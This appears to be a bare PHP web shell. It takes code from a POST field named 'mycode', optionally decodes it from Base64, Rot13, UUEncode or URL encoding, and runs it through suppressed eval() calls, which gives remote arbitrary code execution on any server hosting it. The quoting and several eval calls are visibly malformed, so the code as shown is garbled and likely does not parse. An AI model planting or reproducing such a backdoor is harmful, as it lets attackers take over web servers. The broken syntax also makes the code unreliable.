<?php
echo "start";
$AVuln = $_POST['mycode'];
if ($_POST['encode'] === 'Base64') 
	@eval(@base64_decode(\''.base64_encode($AVuln))); 
elseif ($_POST['encode'] === 'Rot13') 
	@eval(@str_rot13(\''.str_rot13($AVuln)));
elseif ($_POST['encode'] === 'UUEncode') 
	$AVuln = '@eval(@convert_uudecode(\''.convert_uuencode($AVuln))); 
elseif ($_POST['encode'] === 'URLEncode') { 
	$vulnlength = strlen($AVuln); 
	$UrlencodedS = ''; 
	for ($i = 0; $i < $vulnlength; $i++) 
		$UrlencodedS .= '%'.dechex(ord($AVuln[$i])); 
	@eval(@rawurldecode(\''.$UrlencodedS));
}

?>
				
				
				